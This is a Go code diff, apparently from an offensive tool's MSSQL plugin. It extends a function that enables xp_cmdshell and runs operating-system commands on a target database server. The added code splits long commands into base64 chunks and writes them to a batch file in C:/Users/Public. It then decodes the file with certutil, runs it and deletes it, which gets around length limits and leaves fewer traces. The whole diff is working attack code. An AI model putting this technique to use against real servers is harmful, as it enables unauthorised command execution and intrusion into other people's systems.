@@ -3,6 +3,7 @@ package plugins
 import (
 	"context"
 	"database/sql"
+	"encoding/base64"
 	"errors"
 	"fmt"
 	"log"
@@ -71,7 +72,24 @@ func MssqlExec(db *sql.DB, cmd string) {
 		}
 		if count > 0 {
 			db.ExecContext(ctx, "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
-			db.ExecContext(ctx, fmt.Sprintf("exec master..xp_cmdshell '%s'", cmd))
+			if len(cmd) > 128 {
+				flag := 88
+				cmd = base64.StdEncoding.EncodeToString([]byte(cmd))
+				for i := 0; i <= len(cmd)/flag; i++ {
+					var tmpcmd string
+					if i == len(cmd)/flag && len(cmd)-(flag*(i+1))%flag > 0 {
+						tmpcmd = cmd[i*flag:]
+					} else {
+						tmpcmd = cmd[i*flag : (i+1)*flag]
+					}
+					tmpcmd = fmt.Sprintf(`echo|set /p="%s">>C:/Users/Public/q147.bat`, tmpcmd)
+					db.ExecContext(ctx, fmt.Sprintf("exec master..xp_cmdshell '%s'", tmpcmd))
+				}
+				db.ExecContext(ctx, "exec master..xp_cmdshell 'certutil -f -decode C:/Users/Public/q147.bat C:/Users/Public/q147.bat'")
+				db.ExecContext(ctx, "exec master..xp_cmdshell 'C:/Users/Public/q147.bat & del C:\\Users\\Public\\q147.bat'")
+			} else {
+				db.ExecContext(ctx, fmt.Sprintf("exec master..xp_cmdshell '%s'", cmd))
+			}
 		}
 	}
 	return
